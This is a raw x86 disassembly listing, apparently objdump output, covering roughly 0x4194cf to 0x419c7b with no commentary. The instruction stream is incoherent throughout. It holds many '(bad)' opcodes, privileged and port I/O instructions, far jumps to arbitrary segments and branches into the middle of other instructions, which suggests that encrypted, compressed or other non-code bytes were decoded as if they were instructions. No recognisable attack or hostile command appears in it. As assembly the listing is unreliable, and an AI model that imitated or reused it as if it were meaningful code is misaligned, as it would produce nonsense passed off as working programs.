  4194cf:	pop    ebx
  4194d0:	addr16 aaa 
  4194d2:	ret    0xbae8
  4194d5:	dec    al
  4194d7:	daa    
  4194d8:	pop    eax
  4194d9:	cld    
  4194da:	lahf   
  4194db:	adc    bl,BYTE PTR fs:[ebx+0x25]
  4194df:	(bad)  [edi]
  4194e1:	mov    bh,dh
  4194e3:	or     eax,0x6cfccef7
  4194e8:	mov    ah,0xdd
  4194ea:	adc    al,0x8e
  4194ec:	xchg   ebp,eax
  4194ed:	inc    ecx
  4194ee:	xchg   ebx,eax
  4194ef:	lock cmc 
  4194f1:	mov    ebx,0x9f19fbb1
  4194f6:	fstp   QWORD PTR [edi-0x4fb85ac4]
  4194fc:	mov    bl,0xf6
  4194fe:	adc    ah,ah
  419500:	jecxz  0x4194d3
  419502:	gs push ecx
  419504:	push   ebp
  419505:	lahf   
  419506:	or     esp,DWORD PTR [ecx+0x6]
  419509:	pop    es
  41950a:	sub    DWORD PTR [edi+eiz*4+0x1b],esp
  41950e:	fadd   QWORD PTR [ebx+0xf735ea7]
  419514:	cld    
  419515:	nop
  419516:	and    dl,BYTE PTR [eax+0xf601f57]
  41951c:	das    
  41951d:	das    
  41951e:	call   0x6ca:0x213724cf
  419525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419526:	xchg   ebx,eax
  419527:	lock push 0x349d35a2
  41952d:	outs   dx,DWORD PTR ds:[esi]
  41952e:	pop    esp
  41952f:	je     0x41950b
  419531:	iret   
  419532:	mov    DWORD PTR [edi+ebp*4+0x5c71943b],eax
  419539:	das    
  41953a:	push   edx
  41953b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41953c:	inc    edx
  41953d:	mov    gs,WORD PTR [ebp-0x79]
  419540:	push   cs
  419541:	dec    edx
  419542:	sbb    eax,0xe7aca8b1
  419547:	push   0x77e85991
  41954c:	xor    eax,0x5b7104e9
  419551:	lods   eax,DWORD PTR ds:[esi]
  419552:	adc    eax,0x67ffed15
  419557:	mov    edx,0x674282a8
  41955c:	or     edx,edx
  41955e:	shr    al,0xf3
  419561:	rcl    dl,cl
  419563:	xchg   esp,eax
  419564:	sti    
  419565:	mov    dl,0xea
  419567:	cmp    eax,0x3a494da3
  41956c:	xchg   edx,eax
  41956d:	adc    bl,BYTE PTR [esi+0x77]
  419570:	jnp    0x4195c9
  419572:	adc    cl,ah
  419574:	cdq    
  419575:	fild   DWORD PTR [edi]
  419577:	mov    BYTE PTR [edx+0x1b],ch
  41957a:	stos   BYTE PTR es:[edi],al
  41957b:	iret   
  41957c:	dec    esi
  41957d:	sub    BYTE PTR [ebx],ch
  41957f:	js     0x41952c
  419581:	add    BYTE PTR [edx],bl
  419583:	adc    cl,BYTE PTR cs:[ebp-0x3d]
  419587:	idiv   DWORD PTR [eax]
  419589:	jnp    0x419516
  41958b:	fisub  DWORD PTR [eax-0x6ce58fe2]
  419591:	sbb    bh,cl
  419593:	jle    0x41956f
  419595:	jmp    0x69c8:0x69802651
  41959c:	retf   0xe58
  41959f:	and    DWORD PTR [ebx+0x21],ecx
  4195a2:	add    bh,BYTE PTR [edx-0x7f]
  4195a5:	pop    DWORD PTR [esi-0x12b47e02]
  4195ab:	pop    eax
  4195ac:	fxch   st(5)
  4195ae:	sbb    ah,bl
  4195b0:	mov    BYTE PTR [eax+edx*2-0x5461cdf5],cl
  4195b7:	adc    dl,BYTE PTR ds:0xc113d04a
  4195bd:	mov    dl,0x5
  4195bf:	pop    ecx
  4195c0:	xchg   ebx,eax
  4195c1:	mov    dl,0x2
  4195c3:	test   eax,0xaff428e6
  4195c8:	lods   al,BYTE PTR ds:[esi]
  4195c9:	fsubr  DWORD PTR [ebx]
  4195cb:	daa    
  4195cc:	sti    
  4195cd:	push   ebp
  4195ce:	(bad)  
  4195cf:	mul    DWORD PTR [esi-0x4dcd27ed]
  4195d5:	xchg   DWORD PTR [edx],ebp
  4195d7:	xchg   BYTE PTR [esi],ch
  4195d9:	jg     0x4195f7
  4195db:	inc    dx
  4195dd:	fcomp  QWORD PTR [edi-0x3332568e]
  4195e3:	mov    ch,0xe2
  4195e5:	jmp    0x419660
  4195e7:	pop    ebx
  4195e8:	mov    dl,0xb9
  4195ea:	pop    edx
  4195eb:	and    eax,DWORD PTR [ebp+ebp*2+0x12]
  4195ef:	cwde   
  4195f0:	push   DWORD PTR [esi-0x70]
  4195f3:	push   ebx
  4195f4:	dec    ebp
  4195f5:	pop    ebx
  4195f6:	scas   al,BYTE PTR es:[edi]
  4195f7:	adc    eax,0xed50248a
  4195fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195fd:	fs cdq 
  4195ff:	sub    eax,0x404af586
  419604:	aam    0x11
  419606:	push   ebp
  419607:	sar    al,1
  419609:	stos   DWORD PTR es:[edi],eax
  41960a:	mov    cx,0xdd97
  41960e:	jae    0x419665
  419610:	push   esi
  419611:	push   cs
  419612:	inc    ebp
  419613:	or     al,0xf1
  419615:	gs push edi
  419617:	jb     0x419695
  419619:	xchg   ebx,ecx
  41961b:	sbb    DWORD PTR [edx+0x90c4df1],edx
  419621:	mov    ecx,0xa28e8dec
  419626:	xlat   BYTE PTR ds:[ebx]
  419627:	xchg   ebx,eax
  419628:	add    cl,dh
  41962a:	int3   
  41962b:	sub    ch,dh
  41962d:	ss cdq 
  41962f:	fmul   DWORD PTR [edx]
  419631:	push   es
  419632:	xchg   ebp,eax
  419633:	pushf  
  419634:	(bad)  
  419635:	mov    ds:0x6dd8b09e,eax
  41963a:	xchg   ebp,eax
  41963b:	xlat   BYTE PTR ds:[ebx]
  41963c:	and    DWORD PTR [edi-0x52d129a],esi
  419642:	and    DWORD PTR [ebp-0xb],ebp
  419645:	pusha  
  419646:	mov    eax,DWORD PTR [ebx]
  419648:	ins    BYTE PTR es:[edi],dx
  419649:	(bad)  
  41964a:	xchg   edi,eax
  41964b:	xor    ebp,ebx
  41964d:	adc    BYTE PTR [esi+0xc],dl
  419650:	pop    ds
  419651:	add    ebp,DWORD PTR [ecx-0x5d]
  419654:	loopne 0x41965e
  419656:	mov    dh,0x89
  419658:	stos   DWORD PTR es:[edi],eax
  419659:	dec    eax
  41965a:	icebp  
  41965b:	clc    
  41965c:	ds jmp 0x41965c
  41965f:	ret    
  419660:	out    dx,al
  419661:	xchg   edx,eax
  419662:	jg     0x4196ad
  419664:	dec    edx
  419665:	xor    BYTE PTR [edx-0x6d],al
  419668:	push   eax
  419669:	js     0x41964a
  41966b:	cld    
  41966c:	lahf   
  41966d:	inc    BYTE PTR [esi]
  41966f:	sbb    esi,DWORD PTR ds:0x76dc5b68
  419675:	adc    ah,dl
  419677:	xor    al,0x93
  419679:	lock data16 sahf 
  41967c:	cmc    
  41967d:	and    DWORD PTR [eax+0x2c8d27bd],edi
  419683:	add    DWORD PTR [ebx+0x4bc23457],ebx
  419689:	loop   0x41968e
  41968b:	leave  
  41968c:	sub    DWORD PTR [edx-0x2b25295e],ebx
  419692:	xlat   BYTE PTR ds:[ebx]
  419693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419694:	out    0x26,al
  419696:	inc    esp
  419697:	repz jae 0x4196bf
  41969a:	jle    0x419652
  41969c:	adc    BYTE PTR [edx+0x58],bl
  41969f:	les    ebx,FWORD PTR [esi-0x1]
  4196a2:	imul   BYTE PTR [esp+eiz*8+0x43d3bf7a]
  4196a9:	repz add al,BYTE PTR [edx+0x3]
  4196ad:	shr    bh,0x22
  4196b0:	cmp    BYTE PTR [ebp+0x37],bl
  4196b3:	fisubr DWORD PTR [ecx-0x7a]
  4196b6:	loope  0x4196cf
  4196b8:	jae    0x41970a
  4196ba:	push   0xffffffbf
  4196bc:	dec    eax
  4196bd:	push   0xe890f7ab
  4196c2:	icebp  
  4196c3:	lock jl 0x4196dc
  4196c6:	jae    0x41971c
  4196c8:	push   eax
  4196c9:	jp     0x4196a2
  4196cb:	sbb    BYTE PTR [eax+0x3e2b00d2],0xb1
  4196d2:	pop    ss
  4196d3:	cdq    
  4196d4:	test   DWORD PTR [ecx],ecx
  4196d6:	cdq    
  4196d7:	push   eax
  4196d8:	and    edi,DWORD PTR [eax+0x30]
  4196db:	push   es
  4196dc:	shl    BYTE PTR [edi-0x291be452],cl
  4196e2:	sbb    eax,DWORD PTR [esi+0x7b30308b]
  4196e8:	jo     0x419676
  4196ea:	loop   0x4196be
  4196ec:	in     al,dx
  4196ed:	xor    dl,BYTE PTR [esi+0x15bd538b]
  4196f3:	sbb    BYTE PTR [ebp+0x27],0x2
  4196f7:	shr    ah,cl
  4196f9:	pop    ss
  4196fa:	dec    eax
  4196fb:	jg     0x419725
  4196fd:	iret   
  4196fe:	adc    eax,0x65183a8f
  419703:	int3   
  419704:	mov    eax,0xf3766cc4
  419709:	cmp    ch,ah
  41970b:	add    ah,dh
  41970d:	into   
  41970e:	aaa    
  41970f:	jp     0x41972e
  419711:	push   ss
  419712:	and    ecx,eax
  419714:	lock test ebx,0xd64be465
  41971b:	rcr    DWORD PTR [ecx+0x29],cl
  41971e:	ins    DWORD PTR es:[edi],dx
  41971f:	mov    edi,0x2f5d3c7e
  419724:	repz add DWORD PTR [ecx-0x3a],ebp
  419728:	sub    al,0xd2
  41972a:	shr    DWORD PTR [edx+0x1f75f992],0x17
  419731:	not    DWORD PTR [ebp-0x7e2d26d0]
  419737:	jnp    0x4196eb
  419739:	cdq    
  41973a:	jl     0x419724
  41973c:	cmp    ebx,edx
  41973e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41973f:	mov    dh,0x73
  419741:	adc    esp,DWORD PTR [edx+0x3c]
  419744:	call   0x7287:0xc5a2f958
  41974b:	cmc    
  41974c:	adc    dl,BYTE PTR [edi+0x12138369]
  419752:	push   0xffffff90
  419754:	sub    eax,0x897ab14e
  419759:	dec    ebx
  41975a:	ja     0x4196e4
  41975c:	into   
  41975d:	icebp  
  41975e:	iret   
  41975f:	addr16 jp 0x419794
  419762:	mov    WORD PTR [eax+0x6f],es
  419765:	jno    0x4197bf
  419767:	ds push esp
  419769:	jge    0x4196f5
  41976b:	xor    BYTE PTR [edi],bl
  41976d:	jb     0x419706
  41976f:	jo     0x419726
  419771:	pop    ds
  419772:	(bad)  
  419773:	or     edx,esp
  419775:	pop    ecx
  419776:	pop    edi
  419777:	loope  0x41976e
  419779:	adc    BYTE PTR [eax+0x7b],bh
  41977c:	inc    esp
  41977d:	lahf   
  41977e:	pop    ebx
  41977f:	fcomp  DWORD PTR [ecx]
  419781:	add    BYTE PTR [ebx-0x40d3b5a],cl
  419787:	iret   
  419788:	cmp    BYTE PTR [edi+0x26],0x2a
  41978c:	xchg   esp,eax
  41978d:	(bad)
  419790:	adc    DWORD PTR [ecx],ebp
  419792:	mov    ebx,0xa26538ad
  419797:	das    
  419798:	dec    esp
  419799:	sub    al,0xc8
  41979b:	sti    
  41979c:	je     0x4197d9
  41979e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41979f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197a0:	mov    edi,0xd8238fb4
  4197a5:	inc    ebp
  4197a6:	ret    
  4197a7:	inc    edi
  4197a8:	xchg   BYTE PTR [esi+0x36],ch
  4197ab:	mov    ebx,0x909a32a0
  4197b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197b1:	and    BYTE PTR [edx+0x29c5b565],cl
  4197b7:	scas   eax,DWORD PTR es:[edi]
  4197b8:	das    
  4197b9:	loopne 0x4197fa
  4197bb:	mov    ebx,0xdaf4f2d8
  4197c0:	and    al,0xa8
  4197c2:	ret    
  4197c3:	shl    DWORD PTR [ebx],1
  4197c5:	fcmovnbe st,st(3)
  4197c7:	add    eax,0x75c2fceb
  4197cc:	inc    esi
  4197cd:	lods   al,BYTE PTR ds:[esi]
  4197ce:	push   esi
  4197cf:	xchg   edx,eax
  4197d0:	les    ecx,FWORD PTR [edi-0x693e3b67]
  4197d6:	pop    ebx
  4197d7:	xchg   ecx,eax
  4197d8:	mov    al,ds:0x318b6300
  4197dd:	popa   
  4197de:	or     eax,0x64c7ac06
  4197e3:	fsubr  st,st(0)
  4197e5:	jbe    0x419803
  4197e7:	cwde   
  4197e8:	(bad)  
  4197ea:	xchg   DWORD PTR [edx+0x3b],esi
  4197ed:	enter  0xe910,0x74
  4197f1:	xchg   BYTE PTR [edi+esi*8],bl
  4197f4:	(bad)  
  4197f5:	arpl   WORD PTR [ecx-0x3a],ax
  4197f8:	mov    cl,ah
  4197fa:	lods   eax,DWORD PTR ds:[esi]
  4197fb:	dec    esi
  4197fc:	and    DWORD PTR [eax-0x58],esi
  4197ff:	xchg   BYTE PTR [esi-0x302633f0],bh
  419805:	aad    0x61
  419807:	mov    bh,0x62
  419809:	imul   ebp,DWORD PTR [esp+edi*4-0x10],0xffffffff
  41980e:	repnz mov edi,0x22dc9e29
  419814:	fucom  st(4)
  419816:	inc    DWORD PTR [esi+eiz*4-0x69a64023]
  41981d:	scas   eax,DWORD PTR es:[edi]
  41981e:	lods   eax,DWORD PTR ds:[esi]
  41981f:	cmp    eax,0x937ebd5d
  419824:	(bad)  
  419825:	pop    ecx
  419826:	push   cs
  419827:	jge    0x41988e
  419829:	mov    edx,0x85d6c4f5
  41982e:	sbb    eax,esi
  419830:	stos   BYTE PTR es:[edi],al
  419831:	arpl   WORD PTR [edi],si
  419833:	stc    
  419834:	add    ebp,ebx
  419836:	cmp    ecx,esi
  419838:	push   ebx
  419839:	stc    
  41983a:	scas   al,BYTE PTR es:[edi]
  41983b:	xchg   DWORD PTR ds:0x44a10650,esi
  419841:	sub    bh,bh
  419843:	pusha  
  419844:	jmp    FWORD PTR [edx]
  419846:	pop    edi
  419847:	pusha  
  419848:	sbb    bh,BYTE PTR ds:0x46a7222a
  41984e:	mov    WORD PTR [esi],ds
  419850:	inc    eax
  419851:	ds mov esi,0x2de92413
  419857:	jne    0x41986e
  419859:	fistp  WORD PTR [edi]
  41985b:	test   DWORD PTR [esi],esi
  41985d:	lahf   
  41985e:	mov    esi,0xd5a130b9
  419863:	(bad)  
  419864:	stc    
  419865:	cmc    
  419866:	retf   
  419867:	push   edi
  419868:	outs   dx,DWORD PTR ds:[esi]
  419869:	fcmovu st,st(4)
  41986b:	xor    eax,0x1a66b87e
  419870:	pusha  
  419871:	mov    edx,DWORD PTR [edx]
  419873:	mov    eax,ds:0x12a76785
  419878:	int    0xb9
  41987a:	adc    esp,edx
  41987c:	stos   BYTE PTR es:[edi],al
  41987d:	push   ebp
  41987e:	data16 adc ah,bh
  419881:	adc    ecx,DWORD PTR [esp+ebp*2+0xda0e442]
  419888:	dec    ebx
  419889:	in     eax,dx
  41988a:	enter  0x8daa,0x8c
  41988e:	loope  0x4198ec
  419890:	xlat   BYTE PTR ds:[ebx]
  419891:	int3   
  419892:	(bad)  ds:0x313194ab
  419898:	jle    0x4198a7
  41989a:	adc    eax,0xaf206b6c
  41989f:	xchg   BYTE PTR [edx+ecx*2+0x52a0192b],ah
  4198a6:	mov    ah,0xa7
  4198a8:	xchg   ecx,eax
  4198a9:	cdq    
  4198aa:	cmp    ecx,eax
  4198ac:	lds    esi,FWORD PTR [ebp+0x3c393882]
  4198b2:	push   ebp
  4198b3:	add    ecx,esp
  4198b5:	inc    ebp
  4198b6:	push   edi
  4198b7:	and    al,0x67
  4198b9:	out    0xf5,eax
  4198bb:	and    ecx,DWORD PTR [edi]
  4198bd:	inc    ebp
  4198be:	aad    0xf8
  4198c0:	imul   edx,DWORD PTR [eax+eax*4],0xa5214a94
  4198c7:	and    eax,0x2ef8f3e0
  4198cc:	aam    0x25
  4198ce:	repnz arpl WORD PTR ds:0xf567ffec,sp
  4198d5:	mov    dl,0xb9
  4198d7:	(bad)  
  4198d8:	leave  
  4198d9:	ja     0x419913
  4198db:	adc    DWORD PTR [ecx],ebp
  4198dd:	call   0xed1559a2
  4198e2:	sub    dl,BYTE PTR [eax]
  4198e4:	xchg   ebp,eax
  4198e5:	ins    DWORD PTR es:[edi],dx
  4198e6:	fadd   DWORD PTR [esp+esi*1]
  4198e9:	mov    bh,0x1c
  4198eb:	cmc    
  4198ec:	add    al,0x5b
  4198ee:	xor    al,0x59
  4198f0:	sbb    eax,0x2405a4c2
  4198f5:	inc    ebp
  4198f6:	add    esi,DWORD PTR [ecx]
  4198f8:	in     al,dx
  4198f9:	addr16 aas 
  4198fb:	stos   DWORD PTR es:[edi],eax
  4198fc:	sub    cl,bl
  4198fe:	cmp    DWORD PTR [esi],ecx
  419900:	dec    esi
  419901:	cli    
  419902:	nop
  419903:	aam    0x81
  419905:	test   DWORD PTR [eax],ecx
  419907:	sbb    cl,cl
  419909:	mov    edx,0x80700307
  41990e:	(bad)  
  41990f:	mov    esp,0xf5c5412f
  419914:	cmp    DWORD PTR [ecx+ecx*2],esp
  419917:	retf   0x1565
  41991a:	aam    0xb7
  41991c:	sbb    BYTE PTR [eax+edx*1+0x68b8c292],dl
  419923:	scas   eax,DWORD PTR es:[edi]
  419924:	aam    0x3a
  419926:	pop    edi
  419927:	aam    0x4b
  419929:	pop    ebp
  41992a:	inc    esp
  41992b:	nop
  41992c:	mov    gs,WORD PTR [eax]
  41992e:	dec    edi
  41992f:	mov    eax,es
  419931:	pop    ebp
  419932:	sbb    BYTE PTR [ebx+ebp*8+0x3ad67086],dl
  419939:	test   BYTE PTR [eax-0x45],0xcb
  41993d:	push   edx
  41993e:	rcr    BYTE PTR [ecx-0x71],1
  419941:	retf   0x4de4
  419944:	cmc    
  419945:	leave  
  419946:	add    BYTE PTR [edx+ebp*1+0x5c],cl
  41994a:	call   FWORD PTR [ecx-0x5]
  41994d:	dec    ecx
  41994e:	push   ebp
  41994f:	adc    al,0xf0
  419951:	mov    ah,0xcb
  419953:	hlt    
  419954:	or     ebx,edi
  419956:	pop    es
  419957:	lock out dx,al
  419959:	add    ebx,DWORD PTR [esi-0x51d456fb]
  41995f:	lds    ebp,FWORD PTR [ebx-0x30]
  419962:	jecxz  0x41999e
  419964:	ja     0x4199c8
  419966:	and    esi,DWORD PTR [esi-0x61]
  419969:	adc    BYTE PTR [ebx*4-0x45e86c5b],dl
  419970:	xchg   edx,eax
  419971:	jmp    0xf6a2:0xff8a0c07
  419978:	inc    esp
  419979:	pop    edi
  41997b:	xchg   edx,eax
  41997c:	xlat   BYTE PTR ds:[ebx]
  41997d:	cmp    dh,BYTE PTR [edi]
  41997f:	xor    bh,BYTE PTR [edi]
  419981:	aas    
  419982:	cmc    
  419983:	and    eax,DWORD PTR [edi+0x2e9a38da]
  419989:	jb     0x419986
  41998b:	mov    edx,0x9811cfc4
  419990:	jp     0x419912
  419992:	inc    edx
  419993:	mov    ds:0xe2fb8ab5,eax
  419998:	mov    bl,0xcf
  41999a:	dec    eax
  41999b:	dec    ebx
  41999c:	pop    ebx
  41999d:	rol    DWORD PTR [ebx+0x5d8ec3d7],cl
  4199a3:	ins    DWORD PTR es:[edi],dx
  4199a4:	sbb    ecx,edx
  4199a6:	pop    ds
  4199a7:	test   BYTE PTR [esi+0x56],ch
  4199aa:	add    esi,DWORD PTR [ebp-0x35]
  4199ad:	fwait
  4199ae:	mov    fs,WORD PTR [ebp+0x4067cfd1]
  4199b4:	mov    BYTE PTR [eax+0x34],0xf7
  4199b8:	mov    ebp,0x4b92d5f1
  4199bd:	jmp    DWORD PTR [eax+0xf]
  4199c0:	out    0x6b,al
  4199c2:	std    
  4199c3:	dec    edi
  4199c4:	mov    al,ds:0x96bdaaea
  4199c9:	scas   al,BYTE PTR es:[edi]
  4199ca:	mov    ds:0x3b5bd366,eax
  4199cf:	mov    ah,0x3f
  4199d1:	scas   eax,DWORD PTR es:[edi]
  4199d2:	xchg   edi,eax
  4199d3:	cwde   
  4199d4:	or     DWORD PTR [ebx+ebp*8-0x5bf0b753],0x4207397d
  4199df:	shl    DWORD PTR [edi],1
  4199e1:	into   
  4199e2:	call   0x775f:0x1c162527
  4199e9:	and    eax,0xf7fc2b93
  4199ee:	mov    DWORD PTR [ebp-0x5a7e1931],ebx
  4199f4:	push   ebp
  4199f5:	inc    ecx
  4199f6:	scas   eax,DWORD PTR es:[edi]
  4199f7:	imul   ebx,esi,0xffffff80
  4199fa:	test   DWORD PTR ds:0x3c5d456a,eax
  419a00:	mov    ds:0x5518b172,al
  419a05:	push   ebx
  419a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a07:	push   ds
  419a08:	mov    dl,0xaf
  419a0a:	pop    esp
  419a0b:	pop    eax
  419a0c:	cli    
  419a0d:	shr    BYTE PTR [ebx-0x31],0x45
  419a11:	enter  0xf8c9,0x5a
  419a15:	ret    0xaae3
  419a18:	sbb    DWORD PTR [ebp+0x3],edi
  419a1b:	and    BYTE PTR [eax],dh
  419a1d:	dec    eax
  419a1e:	xor    al,0xe1
  419a20:	rol    BYTE PTR [ebp+0x74],1
  419a23:	jno    0x419a85
  419a25:	pop    ebp
  419a26:	dec    edx
  419a27:	pop    ecx
  419a28:	jp     0x4199b4
  419a2a:	lods   al,BYTE PTR ds:[esi]
  419a2b:	cmp    al,0xa3
  419a2d:	int3   
  419a2e:	and    al,0x7
  419a30:	sub    bh,BYTE PTR [eax-0x80]
  419a33:	cs and al,0xc6
  419a36:	sbb    al,0xa1
  419a38:	jg     0x4199fb
  419a3a:	lock inc ebx
  419a3c:	xlat   BYTE PTR ds:[ebx]
  419a3d:	dec    edx
  419a3e:	popa   
  419a3f:	jge    0x419a56
  419a41:	sub    al,0xb3
  419a43:	mov    edi,0x9420505a
  419a48:	retf   
  419a49:	dec    ebp
  419a4a:	imul   edi,DWORD PTR [eax-0x1a4221c1],0xf732ae4
  419a54:	push   ss
  419a55:	mov    ch,0xe
  419a57:	stc    
  419a58:	inc    esi
  419a59:	fs jp  0x419a02
  419a5c:	ret    0xfdc4
  419a5f:	jecxz  0x419a09
  419a61:	int3   
  419a62:	popf   
  419a63:	push   edx
  419a64:	repz jmp 0xc8da:0x4e8909
  419a6c:	lock xor al,0x99
  419a6f:	cwde   
  419a70:	sbb    BYTE PTR [ebx+0x407304cd],dh
  419a76:	retf   0x93ad
  419a79:	jl     0x419adb
  419a7b:	pop    esi
  419a7c:	mov    WORD PTR [ebp+0x5d],fs
  419a7f:	ror    ebx,0x70
  419a82:	xchg   esi,eax
  419a83:	inc    esp
  419a84:	sahf   
  419a85:	je     0x419a78
  419a87:	(bad)  
  419a88:	xchg   ecx,eax
  419a89:	fistp  QWORD PTR [ecx+0xe]
  419a8c:	or     bl,bh
  419a8e:	add    dh,BYTE PTR [ebx+0x53]
  419a91:	aaa    
  419a92:	adc    al,0xf6
  419a94:	jnp    0x419a69
  419a96:	inc    esp
  419a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a98:	xchg   esi,edx
  419a9a:	aam    0x64
  419a9c:	outs   dx,BYTE PTR ds:[esi]
  419a9d:	push   esi
  419a9e:	adc    eax,0x79e48f7c
  419aa3:	(bad)  
  419aa4:	mov    ebx,0xfc8e7709
  419aa9:	rcl    BYTE PTR [edx+0xaf43a5a],1
  419aaf:	cli    
  419ab0:	fs stc 
  419ab2:	repnz rcl DWORD PTR [esi],cl
  419ab5:	mov    ah,0x95
  419ab7:	fst    DWORD PTR [edi-0x58]
  419aba:	sbb    BYTE PTR [edx+eax*1],al
  419abd:	fstp   TBYTE PTR [edi+ecx*2-0x56bd6ae7]
  419ac4:	jmp    0x419afa
  419ac6:	arpl   si,di
  419ac8:	fcmovb st,st(0)
  419aca:	hlt    
  419acb:	pop    ebx
  419acc:	fimul  WORD PTR [ebp+esi*4-0x3f6db23f]
  419ad3:	ret    0x8dd3
  419ad6:	jb     0x419a71
  419ad8:	lea    edx,[edi-0x73]
  419adb:	fwait
  419adc:	jmp    0xd644:0x97f70cb3
  419ae3:	daa    
  419ae4:	push   ss
  419ae5:	jmp    0x419ae4
  419ae7:	sbb    eax,0xbbee0015
  419aec:	outs   dx,BYTE PTR ds:[esi]
  419aed:	add    BYTE PTR [edi+0x33],dl
  419af0:	lea    esi,[esi-0x2c877268]
  419af6:	inc    eax
  419af7:	jmp    0x419a80
  419af9:	sub    DWORD PTR [ebx+0x7ab2ce24],0x11a0695
  419b03:	ins    BYTE PTR es:[edi],dx
  419b04:	ret    0x5d20
  419b07:	pop    edi
  419b08:	xchg   BYTE PTR [ebp-0x4fcebbfa],al
  419b0e:	and    DWORD PTR [edx],eax
  419b10:	cmp    DWORD PTR [edi+0x74],0x36953ddd
  419b17:	inc    ebp
  419b18:	jge    0x419b33
  419b1a:	(bad)  
  419b1b:	call   0x87f767b4
  419b20:	add    BYTE PTR [edi+0x4],dh
  419b23:	popf   
  419b24:	or     BYTE PTR [edi-0x44],0x37
  419b28:	xchg   ebx,eax
  419b29:	cmp    DWORD PTR [ecx],0xee4512e8
  419b2f:	add    al,0x63
  419b31:	adc    eax,DWORD PTR [ecx+0x5a85728b]
  419b37:	icebp  
  419b38:	aas    
  419b39:	and    DWORD PTR [edx],edi
  419b3b:	cld    
  419b3c:	adc    eax,0xf6f60878
  419b41:	imul   ebx,DWORD PTR [esi],0x48d7d18a
  419b47:	push   esp
  419b48:	ror    dh,0xa8
  419b4b:	cs jmp 0xefcb0c00
  419b51:	test   DWORD PTR [eax+0x58],ebp
  419b54:	and    al,0xa5
  419b56:	and    eax,0xa837f7e6
  419b5b:	ins    DWORD PTR es:[edi],dx
  419b5c:	sbb    al,bh
  419b5e:	je     0x419bd2
  419b60:	mov    eax,ds:0xfd2a6a95
  419b65:	fcomp  QWORD PTR [esi]
  419b67:	xchg   edi,eax
  419b68:	mov    al,ds:0x26554c93
  419b6d:	out    0xde,eax
  419b6f:	xchg   ecx,eax
  419b70:	adc    al,0x33
  419b72:	aad    0xc7
  419b74:	cmp    cl,bh
  419b76:	repnz repz adc ebp,DWORD PTR [edx-0x38adc934]
  419b7e:	out    dx,al
  419b7f:	xor    eax,ecx
  419b81:	mov    dl,0x0
  419b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b84:	bound  edi,QWORD PTR [edi-0x63a78a8d]
  419b8a:	and    DWORD PTR [ecx-0x5d],edx
  419b8d:	xchg   edx,eax
  419b8e:	inc    esi
  419b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b90:	jno    0x419b53
  419b92:	mov    esp,0xc1369cc2
  419b97:	dec    ebx
  419b98:	fs sub al,0x50
  419b9b:	inc    ebp
  419b9c:	xlat   BYTE PTR ds:[ebx]
  419b9d:	mov    BYTE PTR ds:0xb8eda2de,ah
  419ba3:	pusha  
  419ba4:	mov    cs,edx
  419ba6:	arpl   WORD PTR [esi-0x75],ax
  419ba9:	dec    esi
  419baa:	fs jle 0x419b7c
  419bad:	jo     0x419c00
  419baf:	inc    esp
  419bb0:	mov    eax,0xd381ac6
  419bb5:	mov    ecx,0xfee9ef11
  419bba:	call   0xd066c97c
  419bbf:	and    eax,0x43ae742b
  419bc4:	jb     0x419ba8
  419bc6:	into   
  419bc7:	jle    0x419c2e
  419bc9:	jnp    0x419bc2
  419bcb:	sbb    bh,dh
  419bcd:	sub    ch,BYTE PTR [esi]
  419bcf:	jns    0x419bf1
  419bd1:	sub    BYTE PTR [esi],bh
  419bd3:	jb     0x419ba4
  419bd5:	outs   dx,BYTE PTR ds:[esi]
  419bd6:	cmp    BYTE PTR [ebp+0x6de465bd],0x52
  419bdd:	pushf  
  419bde:	xor    esp,DWORD PTR [edi+0x71]
  419be1:	and    eax,0x40956081
  419be6:	mov    DWORD PTR [ebx],edi
  419be8:	call   0xd10cafde
  419bed:	xchg   ecx,eax
  419bee:	out    dx,eax
  419bef:	jae    0x419c35
  419bf1:	mov    ebp,0x10f4527a
  419bf6:	fld    QWORD PTR [esi+0x46]
  419bf9:	jne    0x419c1e
  419bfb:	sub    esi,DWORD PTR [ecx+0x5]
  419bfe:	ret    0xa09f
  419c01:	cld    
  419c02:	outs   dx,BYTE PTR ds:[esi]
  419c03:	cmp    al,0x8b
  419c05:	xchg   esi,eax
  419c06:	push   ebp
  419c07:	jo     0x419c55
  419c09:	(bad)  
  419c0a:	hlt    
  419c0b:	ins    BYTE PTR es:[edi],dx
  419c0c:	mov    edi,0x34baa1cb
  419c11:	stos   DWORD PTR es:[edi],eax
  419c12:	mov    dl,ah
  419c14:	adc    al,0x1
  419c16:	xor    DWORD PTR [edx-0x39],edi
  419c19:	mov    es,WORD PTR [ebp-0x74c86f4b]
  419c1f:	into   
  419c20:	and    eax,0xc43ef695
  419c25:	lahf   
  419c26:	or     ebp,eax
  419c28:	xor    al,0x41
  419c2a:	pop    ds
  419c2b:	sub    BYTE PTR [edi+edi*2-0x31],dh
  419c2f:	adc    ebp,DWORD PTR [eax-0x267a53f2]
  419c35:	aam    0xef
  419c37:	out    0xe6,al
  419c39:	ja     0x419ca5
  419c3b:	cmp    eax,0x16f6e563
  419c40:	retf   
  419c41:	aad    0xb2
  419c43:	cs adc edx,0xb17efc17
  419c4a:	test   al,0x57
  419c4c:	bound  esp,QWORD PTR [eax-0x78]
  419c4f:	cmp    DWORD PTR [esi+0x7c],0xa1b546af
  419c56:	sub    dl,dh
  419c58:	inc    ebp
  419c59:	outs   dx,DWORD PTR ds:[esi]
  419c5a:	and    DWORD PTR [eax],esi
  419c5c:	mov    ebx,0xe7e62245
  419c61:	shl    esi,0x2f
  419c64:	cdq    
  419c65:	adc    al,0x62
  419c67:	call   0x431a:0xc2149741
  419c6e:	xor    al,0x2c
  419c70:	int3   
  419c71:	daa    
  419c72:	inc    edx
  419c73:	std    
  419c74:	sbb    ah,bl
  419c76:	or     BYTE PTR [eax-0x60],al
  419c79:	jp     0x419c6e
  419c7b:	lahf   
